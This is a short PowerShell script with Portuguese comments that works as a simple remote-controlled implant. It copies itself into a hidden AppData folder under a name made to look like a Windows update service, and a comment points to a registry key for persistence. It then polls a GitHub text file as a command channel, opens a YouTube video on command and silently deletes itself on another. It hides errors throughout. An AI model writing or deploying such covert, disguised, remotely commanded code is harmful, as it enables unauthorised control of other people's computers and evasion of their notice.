$urlControle = "https://raw.githubusercontent.com/Thiii123/Penthi/main/status.txt"
$videoYoutube = "https://www.youtube.com/watch?v=S_OTz-lpDjw&list=RDEMXEN76kPmWQ-QLKEp_k4tlw&start_radio=1"
# Caminho onde o script se "esconde" (Pasta AppData local)
$caminhoLocal = "$env:LOCALAPPDATA\Microsoft\Windows\update_service.ps1"

# Se o script não estiver rodando da pasta oculta, ele se copia para lá
if ($PSCommandPath -ne $caminhoLocal) {
    Copy-Item -Path $PSCommandPath -Destination $caminhoLocal -Force
    # Opcional: Aqui você poderia adicionar uma chave no registro para iniciar com o Windows
    exit
}

while ($true) {
    try {
        $comando = (Invoke-RestMethod -Uri $urlControle -UseBasicParsing).Trim()
        
        # AÇÃO 1: ABRIR YOUTUBE
        if ($comando -eq "1") {
            Start-Process $videoYoutube
            # Aguarda o comando mudar para não abrir mil abas
            while ((Invoke-RestMethod -Uri $urlControle -UseBasicParsing).Trim() -eq "1") { Start-Sleep -Seconds 30 }
        }
        
        # AÇÃO 2: AUTODESTRUIÇÃO
        elseif ($comando -eq "apagar") {
            # Cria um comando para deletar o arquivo após o fechamento do processo
            Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-Command", "Start-Sleep -Seconds 5; Remove-Item -Path '$caminhoLocal' -Force"
            exit # Fecha o script atual
        }
    }
    catch {
        # Silencioso
    }
    Start-Sleep -Seconds 60
}
